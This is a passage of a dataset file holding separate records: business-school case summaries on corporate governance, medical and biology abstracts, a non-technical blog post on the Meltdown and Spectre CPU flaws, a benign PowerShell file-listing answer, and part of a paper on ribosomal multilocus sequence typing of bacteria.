that had been filed against it. It was during this time the board started looking for candidates both for the CEO and Chairman positions.\n\nPublication Date:\n\nDiscipline:\n\nSource:\n\nProduct number:\n\nLength:\n\nAlso Available in:\n\ndescription\n\nTo maximize their effectiveness, color cases should be printed in color.\n\nIn April 2012, Jenne Britell, the Chairman of the board of directors of United Rentals, Inc. (NYSE: URI) was preparing her notes for an upcoming stockholders' meeting. It was a meeting unlike most other meetings she had chaired. Stockholders were about to vote on a transaction that was perhaps the ultimate fulfillment of the founders' original vision. She was reminded of the company's founding just 15 years earlier and its meteoric growth. With a considerable sense of achievement and satisfaction, she reflected on her tenure as board chair commencing five years ago. Elected to the board in 2006 and then unanimously selected by her peers as Chairman in June 2008, Britell led the board through the aftermath of a tumultuous period that included senior management and board changes, a SEC investigation, financial restatements, the jilting of the company by Cerberus Capital Management in a transaction to acquire URI, and the deepest recession to hit the global economy since the Great Depression. At the meeting, stockholders would be asked to consider approval of a merger agreement between URI, the largest equipment rental company in the world, with RSC, the second largest equipment rental company in the world and URI's largest competitor. The meeting would mark the triumph of a new governance model and company strategy whose development and implementation Britell and CEO Michael Kneeland had led. As Britell reflected on the hard won gains, she also looked forward to the challenges and opportunities that lay ahead as the company managed the integration of RSC's operations with URI and the integration of three new board members from the acquired company. She also reflected on how governance and strategy could continue to evolve as the company planned for the next five years.\n\nlearning objective:\n\nTo discuss the role of the Chairman, the CEO, and the board in sucessfully guiding and leading the company.What makes for a strong and effective board? What is the Chairman's role in leading the board and the company? How does the board manage crisis situations and company growth? How are effective board leaders selected and what qualities must they possess?\n\nPublication Date:\n\nDiscipline:\n\nSource:\n\nProduct number:\n\nLength:\n\nAlso Available in:\n\ndescription\n\nOn January 29, 2013, Elliott Management, a hedge fund run by Paul E. Singer that owned 4.5% of Hess Corporation stock, put forward a slate of five independent directors it wanted elected to improve the company's performance. Elliott argued that Hess lacked focus and was distracted by ventures outside its core exploration and production business. Further it argued that John Hess, CEO and son of the founder, of being more interested in \"maintaining a family dynasty than instilling accountability and addressing chronic underperformance.\"\n\nlearning objective:\n\nThis is a vignette case which outlines the takeover attempt, and subsequent compromises that follow, between a hedge fund and a major oil company in the USA.\n\nPublication Date:\n\nDiscipline:\n\nSource:\n\nProduct number:\n\nLength:\n\nAlso Available in:\n\ndescription\n\nOn July 12, 2012, Bill Ackman's Pershing Square Capital Management announced publicly that it had purchased about $2 billion of Procter and Gamble (P&G) stock. Shares in the company closed up 3.75% the day the disclosure was made public. Ackman told the New York Times that Pershing would be a major P&G shareholder. \"We think it's an underrated stock,\" he said. \"We think there is a lot of great opportunity there.\" During the next several months there was little or no public discussion of the matter although people familiar with the situation reported that Ackman held conversations with P&G directors individually. Then, on April 24, 2013, P&G announced that its 3rd quarter earnings had risen 6%. However its 4th quarter forecast fell short of Wall Street's expectations. Shares fell 5% based on this outlook. P&G results were lagging its peers by 4% in 2012 and 2% in the first quarter of 2013. Then, abruptly in late May, CEO Robert A. McDonald, who was 59, resigned. The board selected A.J. Lafley, (65) who had been McDonald's predecessor to return to lead the company. There was speculation about how long Lafley would stay and in what direction he would take the company. On June 6th, P&G announced that Lafley had appointed four senior executives to lead the company's major businesses, reporting directly to him.\n\nlearning objective:\n\nTakeover attempt by Bill Ackman (purchases $2 billion of P&amp;G stock) and poor performance by the company. CEO resignation and return of ex-CEO's predecessor to lead the company temporarily. Speculation ensues about how long returning CEO would stay at the company and in what direction he would take them.\n\n*required field. You can change details at any time before activation.\n\nThe enrollment number will not limit students' access to materials. Accurate enrollment allows\nus to manage site traffic and course activity.\n\nIf your course is affiliated with an institution not listed here or you need to create a course to last longer than 6 months,\nplease contact HBP Customer Service at custserv@hbsp.harvard.edu or 800-545-7685.\n\nType the information in each box. Boxes marked with an asterisk (*) are required information.\nYou can change the coursepack information, including the Start and Stop Dates and the quantity,\nat any time before you activate the coursepack.\n\nIf your coursepack is affiliated with an institution not listed here or you need to create a coursepack\nwhich is longer than 6 months, please contact HBP Customer Service at custserv@hbsp.harvard.edu\nor 800-545-7685.", "meta": {"pile_set_name": "Pile-CC"}}
{"text": "Taking California health insurance into the 21st Century.\nCalifornia's system of financing and delivering health care is coming apart at the seams. High costs and large numbers of uninsured leave too many of the state's residents vulnerable to illness and exorbitant health care bills. A plan to reform the system must include: universal access, cost containment, equitable financing, a choice of systems, a unified plan, shared risk, and a greater emphasis on disease prevention.", "meta": {"pile_set_name": "PubMed Abstracts"}}
{"text": "New Major CPU Security Flaws\n\nEarlier this week, computer security experts announced the discovery of two major security flaws found in the processors of most of the world\u2019s computers, smartphones, and cloud servers.\n\nThese flaws affect nearly every processor manufactured by Intel since 1995.\n\nThese defects encompass all modern processors capable of a performance feature called \u201cspeculative execution.\u201d A process in which the CPU rapidly accesses multiple areas of memory in order to speed up the operation of your computer. This data is normally protected but experts have discovered bugs that potentially leave information exposed while being queued up for processing. This flaw creates the potential for sensitive data stored in the memory to be read.\n\nThese bugs have been aptly titled: Meltdown and Spectre.\n\nMeltdown is essentially a security flaw which could allow a hacker to circumvent the hardware boundary between programs run by users and the memory of their computer that could potentially be storing sensitive information. Meltdown is a particular problem for the cloud computing services run by the likes of Amazon, Google, and Microsoft.\n\nSpectre could potentially allow a hacker to trick programs that are running properly into unknowingly giving up sensitive information.\n\nBoth bugs carry with them the potential for unauthorized information access through side channels found in computer processors. The good news is chip manufacturers and security professionals have already been hard at work pushing forward patches and solutions to these known issues. Currently, no known hackers have yet been able to take advantage of these flaws.\n\nWhat Can We Do to Prevent Being Affected?\n\nTypical computer users can relax when it comes to Meltdown and keep their systems up to date with security updates. More updates will be coming soon, so be on the lookout and do not hesitate to install them.\n\nSpectre is a more complicated exploit and will take more time to mitigate. Future software patches are expected.\n\nIn these situations it is important to use tried and true digital security best practices:\n\nAvoid unsecured websites\n\nDo not open unknown email\n\nDo not download unknown software\n\nKeep your anti-virus and firewall active\n\nUpdate, Update, Update\n\nAt this time there are no known reports of these bugs being abused in the wild and security professionals have been hard at work on fixes long before they were made public.\n\nIf you have any questions or concerns about your digital security, please contact our IT team to learn what you can do to stay protected.", "meta": {"pile_set_name": "Pile-CC"}}
{"text": "Enhanced initial bone regeneration with inorganic polyphosphate-adsorbed hydroxyapatite.\nInorganic polyphosphate (poly(P)) can promote binding between fibroblast growth factors and their receptors and enhance osteoblastic cell differentiation and calcification. This study evaluated the possibilities for poly(P) adsorbed onto interconnected porous calcium hydroxyapatite (IP-CHA) as a new bone regeneration material. Prepared 1%, 5%, 25% and 50% poly(P)/IP-CHA composites showed the elution peak of poly(P) between 15 and 20 min, respectively, with the highest value from 50% poly(P)/IP-CHA in vitro. Histologically, at 1 week of placement into the femur of rabbits, granulation tissue had penetrated into the pores in all composites and IP-CHA as a control. In contrast, at 2 weeks of placement, newly formed lamellar bone was found in all groups, although a higher amount of bone regeneration was obviously formed in the 25% and 50% poly(P)/IP-CHA with a significantly higher value of bone regeneration ratio of 50% poly(P)/IP-CHA. These results indicate that 25% and 50% poly(P)/IP-CHA composites may enhance initial bone regeneration.", "meta": {"pile_set_name": "PubMed Abstracts"}}
{"text": "Q:\n\nMonitor Azure Files in Storage Account for event : file creation\n\nI know I could use System.IO.FileSystemWatcher in a Powershell script to detect when a file is created in Azure files (in my storage account). Is there a better way to detect a file being created than this method ?\nI can't seem to find any logs that I could perhaps parse ?\nThanks\n\nA:\n\nThis could do you if you really didn't want to use the FileSystemWatch\n$Files = Get-ChildItem -file -Recurse \"C:\\Temp\"\n$IfOlderThan = 60\n$NewlyCreated = @()\n$OldCreated = @()\n$Count = 0\n\nForeach ($file in $files){\n    if($file.CreationTime -gt (Get-Date).AddMinutes(-$IfOlderThan)){\n        $NewlyCreated += $file\n    } Else {\n        $OldCreated += $file\n    }\n}\nWrite-Host \"Found \" -NoNewline;Write-host $($NewlyCreated.Count) -NoNewline -ForegroundColor Green; Write-Host \" file\\s that have been created in the last $IfOlderThan minutes\" \n$NewlyCreated | select Name, Fullname, CreationTime\n\n", "meta": {"pile_set_name": "StackExchange"}}
{"text": "L-Glutamate decarboxylase (GAD) is the enzyme involved in the synthesis of GABA, a major inhibitory neurotransmitter. There are two well characterized GAD isoforms in the brain, namely, GAD65 and GAD67 [(Erlander and Tobin, 1991)]. Recently, we have shown that soluble GAD (SGAD) is activated by dephosphorylation, mediated by calcineurin, and is inhibited by phosphorylation, mediated by PKA (Bao et al., 1994, 1995), whereas the membrane associated GAD (MGAD) is activated by protein phosphorylation which depends on the integrity of synaptic vesicles (Hsu et al., 1999). In addition, we have identified MGAD from synaptosomes as GAD65 (Hsu et al., 1999). Thus, GAD activity appears to be regulated also depending on the partition of GAD in soluble and membrane associated form. In addition, a detailed crystal structure of GAD is essential for understanding the regulation of GAD activity. Hence, we propose to perform the following studies: (1) To determine the three dimensional structure of GAD. This aspect of studies will be carried out in collaboration with Dr. F. Takusagawa (letter of collaboration is attached) who has recently determined the crystal structure of S- adenosylhomocysteine hydrolase (Hu et al., 1999). (2) To elucidate the mechanisms involved in anchoring GAD to synaptic vesicles with special focus on the role of heat shock cognate protein (HSC70) since our results indicate that GAD65, but not GAD67 forms complex with HSC70 (see Preliminary Results). (3) Characterization of GAD65 and GAD67 phosphorylation sites in terms of the identity of phosphoamino acids, the location (sequence), and the number of phosphorylation sites. In addition, site-directed mutagenesis will be used to determine which amino acid residues are important for phosphorylation and regulation of GAD activity. (4) To elucidate the physiological significance of GAD65 and GAD67 phosphorylation. (5) To address whether GAD65 and GAD67 activities are sensitive to intracellular GABA concentrations. The success of a large scale purification of recombinant human brain GAD65 and GAD67 and the availability of subtype specific antibodies for GAD65 and GAD67, ensure the high feasibility of this proposal.", "meta": {"pile_set_name": "NIH ExPorter"}}
{"text": "MLSA\n\n:   multilocus sequence analysis\n\nPMEN\n\n:   Pneumococcal Molecular Epidemiology Network\n\nrMLST\n\n:   ribosomal MLST\n\nSNP\n\n:   single-nucleotide polymorphism\n\nIntroduction {#sec1-1}\n============\n\nSince its inception as a science, microbiology has depended on the reproducible classification of bacteria into types that can be grouped systematically. The association of particular bacterial groups with specific activities, initially used to determine microbial disease aetiology, has been widely successful in identifying and investigating the activities of particular bacteria throughout the biosphere. A variety of data have been used to categorize bacteria, in a number of cases governed by formal schemes such as the International Code of Nomenclature of Bacteria ([@r34]); however, the great diversity of the bacterial domain ([@r32]) has, to date, prevented the development of a single characterization scheme that can be readily applied to all bacteria at all levels of relatedness. Whilst practical means of assigning bacterial isolates to particular taxa exist, there remains debate concerning the biological and evolutionary processes that lead to the generation and maintenance of the clusters of related organisms that form the basis of these formally defined taxa ([@r15]). Irrespective of these debates on the nature of bacterial species, the recent widespread application of very-high-throughput sequencing technologies to bacterial populations and communities has greatly increased the necessity for a genealogical method that can work at different taxonomic levels and which can be used to assist definitions of nomenclature ([@r2]).\n\nGenotypic methods became increasingly important in bacterial characterization throughout the 20th century, complementing, and to an extent replacing, the phenotypic methods originally employed ([@r51]). A major step was the introduction of small subunit (16S) ribosomal RNA sequences into bacterial systematics, which provided a general framework for categorizing bacteria based on evolutionary relationships, thus representing a 'natural' classification system ([@r57]). The genes encoding the 16S rRNA are effective for classification as they are universal, easily sequenced, and conserved. They have been widely employed in bacterial systematic and evolutionary studies, playing a seminal role in establishing the place of the bacteria in the three domains of life ([@r58]), and being widely employed in the examination of bacterial pathogens, including in diagnostic applications ([@r9]). Sequence analysis of the 16S rRNA gene has also been used extensively in the examination of microbial communities, such as the human microbiome ([@r46]) and environmental communities ([@r36]; [@r22]; [@r21]). While 16S rRNA gene phylogenies provide a general framework, they are unable to provide unification between taxonomic and typing schemes, as many bacteria with distinct properties share identical or very similar 16S rRNA gene sequences ([@r51]). This is particularly the case with a number of pathogenic bacteria, where the reliable classification of closely related bacterial specimens into distinct types with particular pathogenic properties is essential for reliable diagnosis and epidemiology ([@r56]).\n\nThe recognition that horizontal genetic exchange is widespread among bacteria ([@r50]) established the necessity of employing multiple loci in characterization schemes, as frequent recombination reassorts loci, consequently breaking down phylogenetic congruence within bacterial genomes ([@r25]). Techniques such as multilocus sequence typing (MLST) ([@r38]), which indexes sequence variation at housekeeping loci, have provided a means of reliably identifying the relationships among related organisms, and have been suggested as a basis for a novel approach to microbial species identification ([@r20]). MLST, however, which typically analyses six to eight genetic loci ([@r37]), does not always provide sufficient resolution among very closely related bacteria ([@r1]). Furthermore, because of the diversity of bacterial metabolism across the domain, and even among quite closely related organisms, each MLST scheme has to be developed for a particular group of related bacteria. MLST schemes are therefore usually limited to bacteria belonging to the same genus, and even within a given genus, several distinct MLST schemes may be required ([@r37]). Thus, although providing a general approach for both bacterial genealogy and typing, MLST and the related method of multilocus sequence analysis (MLSA) ([@r20]) do not provide a practical combined taxonomic and typing approach at all levels of bacterial diversity.\n\nThe recent rapid expansion of nucleotide sequencing capacity with 'next-generation' sequencing technology has greatly increased the number of bacterial genomes available for analysis ([@r42]), with numbers expanding rapidly ([@r7]). This enables a comparative analysis of the genetic variation at shared loci across the whole domain. Here we use a new database platform, Bacterial Isolate Genome Sequence Database (BIGS[db]{.smallcaps}; [@r30]), to implement a combined taxonomic and typing approach for the whole domain Bacteria that provides resolution down to the strain or subspecies level, by indexing the sequences of ribosomal protein-encoding genes in a curated MLST scheme, ribosomal MLST (rMLST). Use of the scheme will enable rapid species and strain identification directly from whole-genome data generated by parallel sequencing techniques (Supplementary Fig. S1).\n\nMethods {#sec1-2}\n=======\n\n {#sec2-1}\n\n### Genomes. {#sec3-1}\n\nWhole-genome data from 1902 strains representing the entire bacterial domain were downloaded from the Integrated Microbial Genomes (IMG) database ([@r39]). These were uploaded to a BIGS[db]{.smallcaps} database, along with taxonomic and provenance data where available. In addition, Illumina whole-genome data for 28 isolates of Pneumococcal Molecular Epidemiology Network 1 (PMEN1) *Streptococcus pneumoniae* ([@r10]) were extracted from the European Bioinformatics Institute (EBI) sequence read archive. The V[elvet]{.smallcaps} *de novo* assembler ([@r61]; [@r62]), shuffle and optimization scripts were used to create contigs using optimal parameters, with kmer lengths between 21 and 51 bp, with no scaffolding. The assembled contigs were uploaded into the BIGS[db]{.smallcaps} database.\n\n### Identification and tagging of *rps* genes. {#sec3-2}\n\nA reference gene BIGS[db]{.smallcaps} database was set up to contain the entire known sequence diversity of the ribosomal protein genes, and this was seeded with data from a few species manually retrieved from IMG and GenBank annotations. The ribosomal protein genes were then tagged in the database by an iterative process of identification by [blastn]{.smallcaps} and [tblastx]{.smallcaps} ([@r3]) searches of the whole genome data against previously defined alleles at progressively lower stringency. Initial [blastn]{.smallcaps} parameters had a cut-off of 70\u200a% identity over 50\u200a% of the alignment length and a word size of 15. Each unique sequence was defined with an arbitrary allele number. After definition of new alleles, any genomes without alleles assigned were scanned again with the same parameters. This was repeated until no further matches were found. At this point, the stringency was reduced by 5\u200a% identity and the process repeated until no further matches were identified down to a stringency of 50\u200a% identity. At this point, [tblastx]{.smallcaps} searches were performed using the same iterative process. When no further matches were identified, extra seeding of the allele database was achieved by an automated Perl script that retrieved alleles from the National Center for Biotechnology Information (NCBI) Entrez Gene database for species with missing data, and the iterative [blast]{.smallcaps} scanning was repeated, starting at the initial stringency settings. Finally, allele sequences were cleaned to ensure that only in-frame sequences without internal stop codons were included and the locus position definitions fixed so that the sequences began at common start sites, where possible. Since allele identification was performed by an iterative process of matching to previously defined sequences, periodic checks of new alleles were made by [blast]{.smallcaps}ing against GenBank to ensure that they did not match other genes. Tagging of the 16S rRNA gene was achieved following initial seeding of the definition database with only a single sequence and [blastn]{.smallcaps} matching.\n\n### Phylogenetic analysis. {#sec3-3}\n\nPhylogenetic trees were generated by exporting ribosomal protein gene sequences from the strain database as an XMFA file containing each locus as an aligned block. [clonalframe]{.smallcaps} analysis was performed for single-genus datasets using [clonalframe]{.smallcaps} version 1.2 ([@r13]) with default parameters. For larger datasets, up to the entire bacterial domain, the XMFA file was converted to an aligned concatenated sequence for neighbour-joining tree analysis using [mega]{.smallcaps} version 5 ([@r33]), with ambiguous positions removed for each sequence pair. Split decomposition analysis was performed using [splitstree]{.smallcaps} version 4 ([@r28]) for species level datasets. For the *S. pneumoniae* tree, the *rpmG* locus was removed from the analysis since three paralogues were identified. No other paralogous loci were removed from any other tree. Interactive Tree of Life (iTOL) ([@r35]) was used to visualize large trees.\n\nTo assess congruence, maximum-likelihood (ML) phylogenetic trees were constructed using [paup]{.smallcaps} version 4 beta 10 ([@r52]) on finished genomes from the entire class Bacilli (*n*\u200a=\u200a144). ML trees for 10 ribosomal protein genes (*rpsB*, *rpsC*, *rpsD*, *rpsE*, *rpsG*, *rpsI*, *rpsK*, *rpsL*, *rpsP* and *rpsT*) with sizes between 400 and 1100 bp were computed and compared using the Shimodaira--Hasegawa test, which determines whether significant differences occur among the tree topologies (differences in log likelihood, \u0394\u2212ln L). Randomization tests were then performed ([@r25]), where the \u0394\u2212ln L values for each of the genes were compared with the equivalent values computed for 200 random trees created from each gene. This analysis was carried out on finished genomes from the entire class Bacilli (*n*\u200a=\u200a144).\n\nOverall mean distances (p-distance) were calculated for each locus by taxonomic class. Sequences were exported from BIGSdb, aligned by codon \\[using the Multiple Sequence Comparison by Log-Expectation ([muscle]{.smallcaps}) tool with default parameters ([@r16])\\], and the number of base differences per site was averaged over all sequence pairs. All ambiguous positions were removed for each sequence pair. A codon-based test of positive selection was also performed for each locus by taxonomic class using the Nei--Gojobori method ([@r45]). The probability of rejecting the null hypothesis of strict neutrality (d~N~\u200a=\u200ad~S~) was tested in favour of the alternative hypothesis (d~N~\\>d~S~). Again, all ambiguous positions were removed for each sequence pair. These analyses were performed in [mega]{.smallcaps}5 ([@r53]). The Hunter--Gaston discriminatory index ([@r26]; [@r27]) was determined for each locus for the entire dataset, the genus *Bacillus*, the monomorphic species *Bacillus anthracis* and *Yersinia pestis*, and for the highly recombinagenic species *Helicobacter pylori*. This analysis was performed using the web tool at <http://insilico.ehu.es/mini_tools/discriminatory_power/>.\n\nResults {#sec1-3}\n=======\n\nUploading of genome sequences {#sec2-2}\n-----------------------------\n\nGenome data for 1902 bacterial isolates were downloaded from the IMG database ([@r39]) and uploaded to a BIGS[db]{.smallcaps} database (available at <http://rmlst.org/>). These were classified as either finished (982, 51.6\u200a%), draft (911, 47.9\u200a%) or permanent draft (9, 0.5\u200a%). Finished genomes had a mean of 1.7 contigs per genome, whereas draft and permanent draft genomes were together represented by 215.5 contigs per genome ([Table 1](#t1){ref-type=\"table\"}). The dataset did not represent an unbiased sampling of bacterial diversity but was limited to taxa for which whole-genome data were available.\n\n###### Tagging status of the 53 rMLST loci used in analysis\n\n  Parameter                                    IMG genome status   *S. pneumoniae* [velvet]{.smallcaps} assemblies               \n  ------------------------------------------- ------------------- ------------------------------------------------- ------------ -----------\n  Strains uploaded                                    920                                982                            1902         28\n  Mean contigs per strain                            215.5                               1.7                           105.1        354.6\n  Strains with all rMLST loci tagged                  499                                674                            1173         28\n  Average complete rMLST genes per strain\\*       48.94 (53)                         52.59 (53)                      50.82 (53)   52.6 (53)\n  Average partial rMLST genes per strain\\*         1.077 (0)                          0.003 (0)                      0.523 (0)    0.39 (0)\n  Average missing rMLST genes per strain\\*         2.990 (0)                          0.404 (0)                      1.655 (0)    0.00 (0)\n  Average internal stop codons per strain\\*        0.702 (0)                          0.329 (0)                      0.509 (0)    1.00 (1)\n\nAverages: main values are mean; modal values are in parentheses.\n\n*De novo* assembly of *S. pneumoniae* genomes {#sec2-3}\n---------------------------------------------\n\nGenome data for 28 *S. pneumoniae* isolates were assembled from short-read archive data into contigs by [velvet]{.smallcaps} assembly. The assemblies varied in hash length from 21 to 37 bp, and the total number of bases in contigs ranged from 1\u200a736\u200a028 to 2\u200a198\u200a465. Values for the length N for which 50\u200a% of all bases in the sequences are in a contig of at least the given length (N50) ranged from 1451 to 47\u200a198 (Supplementary Table S1). These data were uploaded into the BIGS[db]{.smallcaps} database and the quality of assemblies was assessed by [blast]{.smallcaps} searches of *rps* loci. This identified complete coding sequences for 52 ribosomal protein genes from assemblies of 24 of the 28 isolates, confirming that these represented 'high-quality draft genomes'. Multiple stop codons were identified in the *rplX* locus of sequence assemblies from all 28 isolates, a finding in common with 24 of the 29 *S. pneumoniae* genomes uploaded from the IMG database, indicating that the sequence is a pseudogene in this species. Incomplete *rps* sequences were identified at a single, but different locus, for each of three isolates, and sequences for eight loci were incomplete for a fourth strain. Optimized [velvet]{.smallcaps} parameters thus provided full coding sequence for 1445 of a potential 1456 (99.2\u200a%) ribosomal genes, from these assemblies.\n\nLocus identification and curation {#sec2-4}\n---------------------------------\n\nThe majority of the 53 *rps* genes were identified in each of the bacterial genome sequences analysed, by successive [blast]{.smallcaps} searches. This enabled complete *rps* gene profiles (53 loci) to be generated for 1173 genomes (61.7\u200a%), although a few genes were apparently missing in some datasets or were present as partial coding sequences that were situated at the ends of contigs. These missing or partial genes were mainly found in genomes with 'draft' status, as designated in the IMG database ([Table 1](#t1){ref-type=\"table\"}). For the complete genomes an overall mean of 52.59 out of 53 (99.2\u200a%) rMLST loci were identified as full sequences. Most of the remainder were completely missing (no partial sequence identified). Some sequences matched at high identity to complete alleles had nucleotide substitutions that resulted in frameshifts, resulting in internal stop codons (a mean occurrence of 0.329 out of 53 rMLST loci in the complete genomes). In many cases, these appeared to be the result of sequencing errors in homopolymeric tracts, often in genomes sequenced using 454 technology. A total of 674 (68.6\u200a%) complete genomes were tagged at all rMLST loci. As there are 53 loci used in the rMLST scheme, the absence of a gene or its presence as a pseudogene did not affect the accuracy of the approach. In some cases multiple loci were found for particular *rps* genes, and ultimately active curation will be needed for the *rps* loci schemes for the various groups of bacteria. This could be best achieved by specialist curators with knowledge of particular groups of organisms, as is currently done for MLST schemes.\n\nSpecies discrimination {#sec2-5}\n----------------------\n\nRibosomal protein genes from bacteria belonging to 452 genera were identified in the database and their contig locations tagged. Neighbour-joining trees were constructed from the concatenated sequences of 1565 isolates that had sequences determined for at least 52 of the 53 loci. These trees exhibited clear differentiation of classes and genera ([Fig. 1](#f1){ref-type=\"fig\"}, nucleotide tree, and Supplementary Fig. S2, protein tree) and were consistent with existing taxonomy and a tree reconstructed from 16S rRNA gene data ([Fig. 2](#f2){ref-type=\"fig\"}). The main difference between the tree generated from rMLST nucleotide data and that from the 16S rRNA gene data was the high level of resolution seen at the tips of the branches in the rMLST tree ([Fig. 1](#f1){ref-type=\"fig\"}). Both the 16S rRNA tree and the rMLST tree had uncertainty in the deep branches, and there was little phylogenetic signal below the level of class. Using rMLST data from the 144 isolates belonging to the class Bacilli enabled the relationships of related genera to be examined with [clonalframe]{.smallcaps} ([Fig. 3](#f3){ref-type=\"fig\"}). With this analysis, the available genomes belonging to the genus *Bacillus* formed three clades as distinct from each other as from *Listeria*. *Bacillus anthracis*, *Bacillus cereus* and *Bacillus weihenstephenensis* formed one clade; *Bacillus licheniformis*, *Bacillus amyloliquefaciens*, *Bacillus subtilis* and *Bacillus pumilus* another; and *Bacillus halodurans*, *Bacillus pseudofirmus* and *Bacillus clausii* the third ([Fig. 3](#f3){ref-type=\"fig\"}).\n\n![Neighbour-joining tree of the entire bacterial domain reconstructed from concatenated ribosomal protein gene sequences. The analysis involved 1565 sequences from genomes with at least 52 tagged ribosomal protein genes. Subspecies-level resolution is evident.](055459-f1){#f1}\n\n![Neighbour-joining tree of the entire bacterial domain reconstructed from 16S rRNA gene sequences extracted from whole-genome data of 1663 strains.](055459-f2){#f2}\n\n![[clonalframe]{.smallcaps} tree of the class Bacilli using ribosomal protein gene sequences. Two independent, converged runs were merged and a 95\u200a% consensus tree generated. Only finished genomes with 53 ribosomal protein genes identified and tagged were included in the analysis (*n*\u200a=\u200a144). Key: 1, *Streptococcus pyogenes*; 2, *Streptococcus dysgalactiae*; 3, *Streptococcus equi*/*Streptococcus zooepidemicus*; 4, *Streptococcus. uberis*; 5, *Streptococcus agalactiae*; 6, *Streptococcus mutans*; 7, *Streptococcus thermophilus*; 8, *Streptococcus gallolyticus*; 9, *S. pneumoniae*; 10, *Streptococcus mitis*; 11, *Streptococcus gordonii*/*Streptococcus sanguinis*; 12, *Streptococcus suis*; 13, *B. anthracis*/*B. cereus*/*B. weihenstephanensis*; 14, *B. licheniformis*/*B. amyloliquefaciens*/*B. subtilis*/*B. pumilus*; 15, *B. halodurans*/*B. pseudofirmus*/*B. clausii*; 16, *Staphylococcus aureus*; 17, *Staphylococcus epidermidis*/*Staphylococcus haemolyticus*; 18, *Staphylococcus carnosus*/*Staphylococcus saprophyticus*.](055459-f3){#f3}\n\nWithin the genus *Streptococcus*, which had a large number of genomes available, rMLST was able to differentiate distinct groups ([Figs 3](#f3){ref-type=\"fig\"} and [4](#f4){ref-type=\"fig\"}), largely corresponding to existing species designations. The 29 *S. pneumoniae* genomes downloaded from the IMG database ([@r39]) were supplemented with assemblies generated from Illumina data for 28 genomes deposited in the EBI sequence read archive as part of a clinical study of the PMEN1 \\[Spain (23F) \u22121\\] clone ([@r10]). Split decomposition analysis of the concatenated rMLST loci demonstrated a high level of resolution within this single species, not only resolving individual PMEN clones but also resolving at a sub-sequence-type level within the PMEN1 group ([Fig. 5](#f5){ref-type=\"fig\"}). The rMLST loci vary considerably in length and discriminatory power both among loci and among taxonomic classes for specific loci (Supplementary Tables S2 and S3). Inspection of synonymous and non-synonymous substitutions within classes provided no significant evidence of positive selection. For any given species, the number of unique alleles was different among loci and is a consequence of the population structure of the organism. Monomorphic species such as *B. anthracis* and *Y. pestis* have very low sequence diversity, which is not the case for the majority of other bacteria. As an example of the former, relatively little discrimination was observed with the *Y. pestis* genomes in the database (Supplementary Fig. S3). Compared against a published phylogeny using 1364 single-nucleotide polymorphisms (SNPs) ([@r44]), rMLST could differentiate isolates belonging to the early branching 0.PE2 (Pestoides F) and 0.PE3 (Angola) populations.\n\n![[clonalframe]{.smallcaps} tree of the genus *Streptococcus*. Three independent, converged runs were merged and a 95\u200a% consensus tree generated. Only finished genomes with 53 ribosomal protein genes identified and tagged were included in the analysis (*n*\u200a=\u200a45).](055459-f4){#f4}\n\n![Split decomposition of concatenated ribosomal protein genes from *S. pneumoniae* isolates (*n*\u200a=\u200a57). The *rpmG* gene was not included, since there appear to be three loci within the *S. pneumoniae* genome that can exhibit different *rpmG* alleles. The different PMEN clones within the dataset are clearly resolved and the heavily represented PMEN1 group centred around ST-81 shows sub-sequence type resolution.](055459-f5){#f5}\n\nCongruence {#sec2-6}\n----------\n\nThe rMLST groupings generated were independent of the clustering algorithm used, whether it accounted for recombination, e.g. [clonalframe]{.smallcaps}, or not, indicating a strong clonal signal that was robust to horizontal genetic exchange. This was formally tested by a congruence test of 10 *rps* loci, chosen to be roughly equivalent to complete coding sequence lengths of between 400 and 1100 bp, within the class Bacilli (*n*\u200a=\u200a144). This showed that although the topologies among trees drawn with single-locus data were significantly different from each other, these differences were comparatively small (Supplementary Tables S4 and S5), suggesting that phylogeny was largely conserved among these loci. Congruence was better among rMLST loci than among rMLST loci and random trees representing the range of topologies that would be expected if the loci were undergoing high levels of horizontal genetic exchange.\n\nDiscussion {#sec1-4}\n==========\n\nHigh-resolution bacterial characterization is of great importance to all areas of microbiology, but is particularly important for pathogenic bacteria, where rapid, precise identification of a disease-causing bacterium is often of high clinical or public health importance ([@r56]). Pathogens of humans and their domesticated animals and plants have emerged many times from essentially all parts of the domain ([@r12]; [@r8]), and therefore a general approach that works for clinical specimens will be applicable to all members of the domain. Nucleotide sequence data, especially of protein-encoding genes, have a number of advantages in both taxonomic and typing schemes, as they are high-resolution, reproducible and portable, and can be analysed with a variety of evolutionary and population genetic approaches ([@r38]). The development of a unified scheme has, however, been hindered by the extensive diversity of the bacterial domain with members, most yet to be cultured ([@r47]), found in virtually all known biological niches and participating in the majority of biochemical processes described to date ([@r32]); consequently, few core metabolic genes that can be targeted in a universal genealogy are shared by all bacteria.\n\nThe widespread occurrence of horizontal genetic exchange among diverse members of the bacterial domain provides a further obstacle to phylogeny-based bacterial characterization, as different loci within the same genome can have widely different evolutionary histories ([@r25]). This is especially true of the accessory genome -- the genetic material that is not present in all members of the group. Hence most approaches to establishing the relationships among bacteria have concentrated on using multiple core-genome loci which are under stabilizing selection. What constitutes a 'core genome' is, however, difficult to define, and differs among different bacterial groups: this is why separate MLST schemes are required even for quite closely related bacteria ([@r37]). Sequence variation in the core genome is also subject to horizontal genetic exchange, leading to incongruent phylogenies ([@r17]), and as incongruence can also be generated by the saturation of variable sites, the simple act of including more sequences does not necessarily generate a reliable phylogeny ([@r29]). The generation of robust phylogenetic groupings therefore requires the appropriate choice of multiple genetic loci.\n\nThe 53 *rps* genes, which are shared and functionally conserved amongst all members of the domain, and indeed across the three domains of life ([@r49]; [@r40]), are among the few candidate loci that can be targeted by a combined taxonomic and typing system for all bacteria. Their distribution around the bacterial chromosome ([@r19]) and the increasing understanding of their structure--function relationships ([@r4]) represent further advantages. Using these loci for combined taxonomy and typing is an extension of the highly successful 16S rRNA gene approach ([@r57]), and it is worthy of note that previous attempts to define a set of core genes shared among all bacterial genomes have identified many, but not all, of the ribosomal subunit genes ([@r59], [@r60]; [@r8]; [@r54]). This is because there is appreciable variation at a number of the *rps* loci across the whole domain ([@r23]); however, it is the inclusion of the more variable genes that gives the subspecies resolution achieved by rMLST, and that makes it especially powerful as a universal tool. The identification, indexing and curation of the *rps* genes across the domain described here represent a first step in an ongoing process, equivalent to that currently undertaken for MLST schemes ([@r37]). The BIGS[db]{.smallcaps} platform can accommodate this effort, as any number of curators, each with defined editing privileges over particular schemes, can be assigned, and the system maintains logs of changes made to annotation or locus definitions ([@r30]). In addition the rMLST scheme can co-exist with any number of other schemes incorporating the same or different loci, enabling easy cross-referencing of the various schemes and the combination of, for example, rMLST with conventional MLST, antigen fine typing, or antibiotic resistance deduction from nucleotide sequences. Processing of whole-genome data using rMLST and the 